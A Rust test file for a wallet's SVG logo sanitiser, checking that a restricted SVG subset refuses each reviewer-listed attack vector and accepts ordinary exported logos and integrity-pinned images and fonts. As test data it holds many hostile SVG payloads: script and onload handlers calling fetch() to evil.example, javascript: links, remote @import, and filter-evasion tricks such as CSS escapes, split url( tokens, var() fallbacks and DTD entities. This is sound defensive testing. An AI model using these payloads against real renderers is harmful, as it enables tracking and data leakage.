//! The static SVG subset (PaSO Proof SD-JWT-VC and SVG, Section 3; PaSO View, Section 3): a row
//! per reviewer vector, each refused for its cause; a typical exported logo shown; resources
//! admitted by their content, at most `MAX_RESOURCES` of them.

use serde_json::json;
use siros_transaction_data::{
    CssFault, DataFault, Dimensions, FontFault, ImageFault, Incompatibility, IntegrityFault,
    Location, LocationStep, SvgFault, MAX_DEPTH, MAX_RESOURCES,
};

use crate::common::{
    b64, configured, credential, entries, ok, png, query, rows, sri, Documents, Host, Shown, CARD,
};

const TYPE: &str = "urn:paso:sca:com.example:logo:1";
const SVG: &str = "http://www.w3.org/2000/svg";
const XHTML: &str = "http://www.w3.org/1999/xhtml";
const XML: &str = "http://www.w3.org/XML/1998/namespace";

/// An SVG document of 10 by 10 holding `inner`.
fn svg(inner: &str) -> String {
    format!(
        r#"<svg xmlns="{SVG}" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10">{inner}</svg>"#
    )
}

/// The rows the card shows for an SVG logo of `document`, the host answering fetches with
/// `documents`.
fn outcome(document: &str, documents: Documents) -> Shown {
    let definition = json!({"claims": [
        {"path": ["logo"], "value_type": "image", "display": [{"locale": "en", "name": "Logo"}]}
    ]});
    let mut host = Host::new(json!([configured(TYPE, CARD, &definition)]));
    host.images = documents;
    let logo = format!("data:image/svg+xml;base64,{}", b64(document.as_bytes()));
    let entry = json!({"type": TYPE, "credential_ids": ["card"], "payload": {"logo": logo}});
    let entries = entries(&[entry.to_string()], &query(&["card"], CARD));
    rows(&host, &entries[0], &credential(CARD, &[]))
}

fn refused(fault: SvgFault) -> Shown {
    let logo = Location::new(vec![LocationStep::Key("logo".to_owned())]);
    Err(Incompatibility::Image(logo, ImageFault::Svg(fault)))
}

fn shown() -> Shown {
    Ok(vec![("Logo".to_owned(), "<image Svg>".to_owned())])
}

fn element(namespace: &str, name: &str) -> SvgFault {
    SvgFault::Element(Some(namespace.to_owned()), name.to_owned())
}

fn unpinned(url: &str) -> SvgFault {
    SvgFault::ReferenceUnpinned(url.to_owned())
}

fn attribute(element: &str, namespace: Option<&str>, name: &str) -> SvgFault {
    SvgFault::Attribute {
        element: element.to_owned(),
        namespace: namespace.map(str::to_owned),
        name: name.to_owned(),
    }
}

/// A Data URL of `bytes` in base64, of `media_type`.
fn data(media_type: &str, bytes: &[u8]) -> String {
    format!("data:{media_type};base64,{}", b64(bytes))
}

/// A WOFF2 font of one table: its header, a directory entry for `cmap` of 4 bytes, and 4 bytes
/// of compressed data.
fn woff2() -> Vec<u8> {
    let mut font = b"wOF2".to_vec();
    font.extend_from_slice(&[0, 1, 0, 0]); // flavor: TrueType outlines
    font.extend_from_slice(&54_u32.to_be_bytes()); // length
    font.extend_from_slice(&[0, 1, 0, 0]); // numTables, reserved
    font.extend_from_slice(&8_u32.to_be_bytes()); // totalSfntSize
    font.extend_from_slice(&4_u32.to_be_bytes()); // totalCompressedSize
    font.extend_from_slice(&[0; 24]); // versions, metadata and private blocks
    font.extend_from_slice(&[0, 4]); // flags: cmap, null transform; origLength 4
    font.extend_from_slice(b"data");
    font
}

#[test]
fn each_vector_outside_the_subset_is_refused() {
    let x = "https://evil.example/x.png";
    let nested = format!(
        "data:image/svg+xml;base64,{}",
        b64(br#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url(https://evil.example/n.png)"/></svg>"#)
    );
    let active =
        br#"<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.example/t')"/>"#;
    let active_png = data("image/png", active);
    let active_percent: String = std::iter::once("data:image/png,".to_owned())
        .chain(active.iter().map(|byte| format!("%{byte:02X}")))
        .collect();
    let gif = data(
        "image/png",
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00!\xff\x0bNETSCAPE2.0",
    );
    let text = data("image/jpeg", b"hello");
    let huge = data("image/png", &png(100_000, 100_000));
    let rows: Vec<(&str, String, SvgFault)> = vec![
        (
            "url( lowercase",
            svg(&format!(r#"<rect style="fill:url({x})"/>"#)),
            unpinned(x),
        ),
        (
            "URL( in capitals",
            svg(&format!(r#"<rect style="fill:URL({x})"/>"#)),
            unpinned(x),
        ),
        (
            "a CSS escape spelling url(",
            svg(&format!(r"<style>rect{{fill:\75 rl({x})}}</style>")),
            unpinned(x),
        ),
        (
            "a character reference spelling url(",
            svg(&format!(r#"<rect style="fill:&#117;rl({x})"/>"#)),
            unpinned(x),
        ),
        (
            "@IMPORT in capitals",
            svg(r#"<style>@IMPORT "https://evil.example/s.css";</style>"#),
            SvgFault::Css(CssFault::AtRule("IMPORT".to_owned())),
        ),
        (
            "a comment before @import's string",
            svg(r#"<style>@import/**/"https://evil.example/s.css";</style>"#),
            SvgFault::Css(CssFault::AtRule("import".to_owned())),
        ),
        (
            "@import with a comment in CDATA",
            svg(r#"<style><![CDATA[@import/* x */'https://evil.example/s.css';]]></style>"#),
            SvgFault::Css(CssFault::AtRule("import".to_owned())),
        ),
        (
            "an XML comment splitting url( in a style element",
            svg(&format!(
                r#"<style>rect{{fill:u<!-- x -->rl({x})}}</style>"#
            )),
            SvgFault::StyleContent,
        ),
        (
            "an XML comment splitting @import",
            svg(r#"<style>@im<!-- x -->port "https://evil.example/s.css";</style>"#),
            SvgFault::StyleContent,
        ),
        (
            "an element splitting url( in a style element",
            svg(&format!(r#"<style>rect{{fill:u<g/>rl({x})}}</style>"#)),
            SvgFault::StyleContent,
        ),
        (
            "CDATA splitting url( in a style element",
            svg(&format!(
                r#"<style>rect{{fill:u<![CDATA[rl({x})]]>}}</style>"#
            )),
            unpinned(x),
        ),
        (
            "an xml-stylesheet processing instruction",
            format!(
                r#"<?xml-stylesheet href="https://evil.example/s.css"?>{}"#,
                svg("")
            ),
            SvgFault::ProcessingInstruction("xml-stylesheet".to_owned()),
        ),
        (
            "foreignObject",
            svg(
                r#"<foreignObject><img xmlns="http://www.w3.org/1999/xhtml" srcset="https://evil.example/a.png 1x"/></foreignObject>"#,
            ),
            element(SVG, "foreignObject"),
        ),
        (
            "an XHTML img with srcset",
            svg(
                r#"<img xmlns="http://www.w3.org/1999/xhtml" srcset="https://evil.example/a.png 1x"/>"#,
            ),
            element(XHTML, "img"),
        ),
        (
            "an XHTML video with a poster",
            svg(
                r#"<video xmlns="http://www.w3.org/1999/xhtml" poster="https://evil.example/p.png"/>"#,
            ),
            element(XHTML, "video"),
        ),
        (
            "an XHTML object",
            svg(
                r#"<object xmlns="http://www.w3.org/1999/xhtml" data="https://evil.example/a.svg"/>"#,
            ),
            element(XHTML, "object"),
        ),
        (
            "an XHTML iframe with srcdoc",
            svg(
                r#"<iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;img src=https://evil.example/i.png&gt;"/>"#,
            ),
            element(XHTML, "iframe"),
        ),
        (
            "an XHTML body with a background",
            svg(
                r#"<body xmlns="http://www.w3.org/1999/xhtml" background="https://evil.example/b.png"/>"#,
            ),
            element(XHTML, "body"),
        ),
        (
            "an XInclude",
            svg(
                r#"<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="https://evil.example/x.xml"/>"#,
            ),
            element("http://www.w3.org/2001/XInclude", "include"),
        ),
        (
            "set",
            svg(
                r#"<image width="10" height="10"><set attributeName="href" to="https://evil.example/x.png"/></image>"#,
            ),
            element(SVG, "set"),
        ),
        (
            "animate",
            svg(
                r#"<rect width="10" height="10"><animate attributeName="fill" values="url(https://evil.example/x.png)"/></rect>"#,
            ),
            element(SVG, "animate"),
        ),
        (
            "an inline script",
            svg("<script>new Image().src='https://evil.example/t'</script>"),
            element(SVG, "script"),
        ),
        (
            "a script by href",
            svg(r#"<script href="https://evil.example/s.js"/>"#),
            element(SVG, "script"),
        ),
        (
            "a link to javascript:",
            svg(r#"<a href="javascript:alert(1)"><rect width="1" height="1"/></a>"#),
            element(SVG, "a"),
        ),
        (
            "feImage",
            svg(&format!(r#"<filter id="f"><feImage href="{x}"/></filter>"#)),
            element(SVG, "feImage"),
        ),
        (
            "a STYLE element in capitals",
            svg(&format!(r#"<STYLE>rect{{fill:url({x})}}</STYLE>"#)),
            element(SVG, "STYLE"),
        ),
        (
            "a Style element with @import",
            svg(r#"<Style>@import "https://evil.example/s.css";</Style>"#),
            element(SVG, "Style"),
        ),
        (
            "an event handler",
            svg(r#"<rect width="10" height="10" onload="fetch('https://evil.example/t')"/>"#),
            attribute("rect", None, "onload"),
        ),
        (
            "an HREF attribute in capitals",
            svg(&format!(r#"<image width="10" height="10" HREF="{x}"/>"#)),
            attribute("image", None, "HREF"),
        ),
        (
            "xml:base",
            svg(r##"<g xml:base="https://evil.example/"><use href="#a"/></g>"##),
            attribute("g", Some(XML), "base"),
        ),
        (
            "an href on an element that takes none",
            svg(&format!(r#"<rect href="{x}"/>"#)),
            attribute("rect", None, "href"),
        ),
        (
            "xlink:href to an unpinned document",
            svg(r#"<use xlink:href="https://evil.example/s.svg#a"/>"#),
            SvgFault::ReferenceIntegrity(
                "https://evil.example/s.svg#a".to_owned(),
                IntegrityFault::Malformed,
            ),
        ),
        (
            "a tab inside the scheme",
            svg("<image width=\"10\" height=\"10\" href=\"ht&#9;tps://evil.example/x.png\"/>"),
            SvgFault::ReferenceNotHttps("ht\ttps://evil.example/x.png".to_owned()),
        ),
        (
            "an SVG Data URL nested",
            svg(&format!(
                r#"<image width="10" height="10" href="{nested}"/>"#
            )),
            SvgFault::ResourceType(nested.clone()),
        ),
        (
            "@font-face src unpinned",
            svg("<style>@font-face{font-family:x;src:url(https://evil.example/f.woff)}</style>"),
            unpinned("https://evil.example/f.woff"),
        ),
        (
            "-webkit-image-set",
            svg(&format!(
                r#"<rect style="fill:-webkit-image-set('{x}' 1x)"/>"#
            )),
            unpinned(x),
        ),
        (
            "image() of CSS Images 4",
            svg(&format!(r#"<rect style="fill:image('{x}')"/>"#)),
            unpinned(x),
        ),
        (
            "a string in a parenthesis inside image-set()",
            svg(&format!(
                r#"<rect style="mask-image:image-set(('{x}') 1x)"/>"#
            )),
            unpinned(x),
        ),
        (
            "a var() fallback string in image-set()",
            svg(&format!(
                r#"<rect style="mask-image:image-set(var(--n,'{x}') 1x)"/>"#
            )),
            SvgFault::Css(CssFault::UrlVariable),
        ),
        (
            "a var() fallback string in -webkit-image-set()",
            svg(&format!(
                r#"<rect style="mask-image:-webkit-image-set(var(--n,'{x}') 1x)"/>"#
            )),
            SvgFault::Css(CssFault::UrlVariable),
        ),
        (
            "a var() fallback string in image()",
            svg(&format!(
                r#"<style>rect{{mask-image:image(var(--n,"{x}"))}}</style>"#
            )),
            SvgFault::Css(CssFault::UrlVariable),
        ),
        (
            "a var() fallback string in src()",
            svg(&format!(
                r#"<rect style="mask-image:src(var(--n,'{x}'))"/>"#
            )),
            SvgFault::Css(CssFault::UrlVariable),
        ),
        (
            "a var() fallback string in cross-fade()",
            svg(&format!(
                r#"<rect style="mask-image:cross-fade(var(--n,'{x}') 50%, url(#a))"/>"#
            )),
            SvgFault::Css(CssFault::UrlVariable),
        ),
        (
            "a var() inside a gradient inside image-set()",
            svg(r#"<rect style="mask-image:image-set(linear-gradient(var(--c),red) 1x)"/>"#),
            SvgFault::Css(CssFault::UrlVariable),
        ),
        (
            "nested var() fallbacks in image-set()",
            svg(&format!(
                r#"<rect style="mask-image:image-set(var(--a,var(--b,'{x}')) 1x)"/>"#
            )),
            SvgFault::Css(CssFault::UrlVariable),
        ),
        (
            "a custom property holding a string, used in image-set()",
            svg(&format!(
                r#"<style>:root{{--logo:"{x}"}}svg{{background-image:image-set(var(--logo) 1x)}}</style>"#
            )),
            SvgFault::Css(CssFault::CustomProperty("--logo".to_owned())),
        ),
        (
            "a custom property holding a string in a block of its value",
            svg(&format!(r#"<rect style="--u:(}};'{x}')"/>"#)),
            SvgFault::Css(CssFault::CustomProperty("--u".to_owned())),
        ),
        (
            "a custom property holding a url token",
            svg(&format!(
                r#"<style>svg{{--u:url({x})}}rect{{mask-image:var(--u)}}</style>"#
            )),
            SvgFault::Css(CssFault::CustomProperty("--u".to_owned())),
        ),
        (
            "a Data URL labelled PNG holding an SVG document",
            svg(&format!(
                r#"<image width="1" height="1" href="{active_png}"/>"#
            )),
            SvgFault::ResourceType(active_png.clone()),
        ),
        (
            "a percent-encoded Data URL labelled PNG holding an SVG document",
            svg(&format!(
                r#"<rect style="mask-image:url({active_percent})"/>"#
            )),
            SvgFault::ResourceType(active_percent.clone()),
        ),
        (
            "a Data URL labelled PNG holding an animated GIF",
            svg(&format!(r#"<image width="1" height="1" href="{gif}"/>"#)),
            SvgFault::ResourceType(gif.clone()),
        ),
        (
            "a Data URL labelled JPEG holding text",
            svg(&format!(r#"<image width="1" height="1" href="{text}"/>"#)),
            SvgFault::ResourceType(text.clone()),
        ),
        (
            "a Data URL of a PNG of 100000 by 100000 pixels",
            svg(&format!(r#"<image width="1" height="1" href="{huge}"/>"#)),
            SvgFault::ResourceTooManyPixels(
                huge.clone(),
                Dimensions {
                    width: 100_000,
                    height: 100_000,
                },
            ),
        ),
        (
            "a Data URL with a broken percent escape",
            svg(r#"<image width="1" height="1" href="data:image/png,%zz"/>"#),
            SvgFault::DataReference("data:image/png,%zz".to_owned(), DataFault::Percent),
        ),
        (
            "a function the subset does not know",
            svg(r#"<rect style="fill:element(#a) attr(href url)"/>"#),
            SvgFault::Css(CssFault::Function("element".to_owned())),
        ),
        (
            "a bad url token",
            svg(r#"<rect style="fill:url(a b)"/>"#),
            SvgFault::Css(CssFault::Unreadable),
        ),
    ];
    for (case, document, fault) in rows {
        assert_eq!(outcome(&document, Vec::new()), refused(fault), "{case}");
    }
    for (case, document) in [
        (
            "an internal subset with an entity",
            r#"<!DOCTYPE svg [<!ENTITY e "url(https://evil.example/x.png)">]><svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:&e;"/></svg>"#,
        ),
        (
            "an internal subset after a literal holding >",
            r#"<!DOCTYPE svg SYSTEM "a>b" [<!ENTITY e "url(https://evil.example/x.png)">]><svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:&e;"/></svg>"#,
        ),
    ] {
        assert_eq!(
            outcome(document, Vec::new()),
            refused(SvgFault::Xml(roxmltree::Error::DtdDetected)),
            "{case}"
        );
    }
}

/// Nesting past `MAX_DEPTH` is refused before the parser recurses into it: the refusal runs on
/// a 1 MiB stack, which parsing 20000 levels overflows. A document at the bound is shown.
#[test]
fn nesting_is_bounded_before_the_parse() {
    // Within the root element: `levels` + 1 levels.
    let nested = |levels: usize| {
        svg(&format!(
            "{}{}",
            "<g>".repeat(levels),
            "</g>".repeat(levels)
        ))
    };
    let deep = nested(20_000);
    let outcome_deep = std::thread::Builder::new()
        .stack_size(1 << 20)
        .spawn(move || outcome(&deep, Vec::new()))
        .unwrap()
        .join()
        .unwrap();
    assert_eq!(outcome_deep, refused(SvgFault::Nesting));
    assert_eq!(outcome(&nested(MAX_DEPTH - 1), Vec::new()), shown());
    assert_eq!(
        outcome(&nested(MAX_DEPTH), Vec::new()),
        refused(SvgFault::Nesting)
    );
}

/// A logo as a drawing program exports it: an XML declaration, a style sheet of classes, a
/// gradient the classes paint with, text, and custom data.
#[test]
fn an_exported_logo_is_shown() {
    let logo = r##"<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 120 40" width="120" height="40">
  <defs>
    <style>
      .cls-1 { fill: url(#gradient); }
      .cls-2 { fill: #1d1d1b; font-family: Helvetica, Arial, sans-serif; font-size: 18px; }
      @media (prefers-color-scheme: dark) { .cls-2 { fill: rgb(240 240 240 / 90%); } }
    </style>
    <linearGradient id="gradient" x1="0" y1="0" x2="1" y2="1" gradientUnits="objectBoundingBox">
      <stop offset="0" stop-color="#0057b8"/>
      <stop offset="1" stop-color="#ffd700"/>
    </linearGradient>
  </defs>
  <title>Shop</title>
  <!-- Layer 1 -->
  <g id="Layer_1" data-name="Layer 1">
    <circle class="cls-1" cx="20" cy="20" r="18"/>
    <text class="cls-2" x="44" y="26" xml:space="preserve">Shop</text>
    <path d="M40 34h70" stroke="#1d1d1b" stroke-width="2" transform="translate(0 1)"/>
  </g>
</svg>"##;
    assert_eq!(outcome(logo, Vec::new()), shown());
}

/// A pinned resource passes when it is a PNG or JPEG image or a font whose header reads, and is
/// refused when it is an SVG document, a style sheet, or a font whose directory does not read.
/// The wallet fetches each URL once, checks it against every integrity value the document gives
/// it, and fetches at most `MAX_RESOURCES` URLs.
#[test]
fn resources_pass_by_their_content() {
    let pinned = |url: &str, body: &[u8]| format!("{url}#{}", sri(body).replace('=', "%3D"));
    let face = |source: &str| {
        svg(&format!(
            "<style>@font-face{{font-family:x;src:url({source})}}</style>"
        ))
    };
    let font = "https://cdn.example/f.woff2";
    let woff2 = woff2();
    assert_eq!(
        outcome(
            &face(&pinned(font, &woff2)),
            vec![(font.to_owned(), ok(&woff2))]
        ),
        shown()
    );
    assert_eq!(
        outcome(&face(&data("font/woff2", &woff2)), Vec::new()),
        shown(),
        "a Data URL font"
    );
    let otto_svg = br#"OTTO<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>"#;
    assert_eq!(
        outcome(
            &face(&pinned(font, otto_svg)),
            vec![(font.to_owned(), ok(otto_svg))]
        ),
        refused(SvgFault::ResourceFont(
            font.to_owned(),
            FontFault::Truncated
        ))
    );

    let inner = br#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url(https://evil.example/leak.png)"/></svg>"#;
    let sheet = b"rect{fill:url(https://evil.example/leak.png)}";
    for (url, body) in [
        ("https://img.example/n.svg", inner.as_slice()),
        ("https://img.example/s.css", sheet.as_slice()),
    ] {
        let document = svg(&format!(
            r#"<image width="1" height="1" href="{}"/>"#,
            pinned(url, body)
        ));
        assert_eq!(
            outcome(&document, vec![(url.to_owned(), ok(body))]),
            refused(SvgFault::ResourceType(url.to_owned())),
            "{url}"
        );
    }

    let url = "https://img.example/a.png";
    let part = png(1, 1);
    let digest = sri(&part);
    // The fragment with its character at `at` percent-encoded.
    let spelled = |at: usize| -> String {
        digest
            .char_indices()
            .map(|(i, c)| {
                if i == at {
                    format!("%{:02X}", u32::from(c))
                } else {
                    c.to_string()
                }
            })
            .collect()
    };
    let spellings: String = std::iter::once(format!(" {url}#{digest}"))
        .chain((0..MAX_RESOURCES).map(|at| format!("{url}#{}", spelled(at))))
        .map(|reference| format!(r#"<image width="1" height="1" href="{reference}"/>"#))
        .collect();
    assert_eq!(
        outcome(&svg(&spellings), vec![(url.to_owned(), ok(&part))]),
        shown(),
        "one URL, its fragment spelled {} ways",
        MAX_RESOURCES + 1
    );
    let other = pinned(url, b"other");
    let both = svg(&format!(
        r#"<image width="1" height="1" href="{}"/><image width="1" height="1" href="{other}"/>"#,
        pinned(url, &part)
    ));
    assert_eq!(
        outcome(&both, vec![(url.to_owned(), ok(&part))]),
        refused(SvgFault::ReferenceIntegrity(
            other,
            IntegrityFault::Mismatch
        ))
    );

    let images: String = (0..=MAX_RESOURCES)
        .map(|i| {
            let url = format!("https://img.example/{i}.png");
            format!(
                r#"<image width="1" height="1" href="{}"/>"#,
                pinned(&url, &[0])
            )
        })
        .collect();
    assert_eq!(
        outcome(&svg(&images), Vec::new()),
        refused(SvgFault::TooManyResources(MAX_RESOURCES + 1))
    );
}
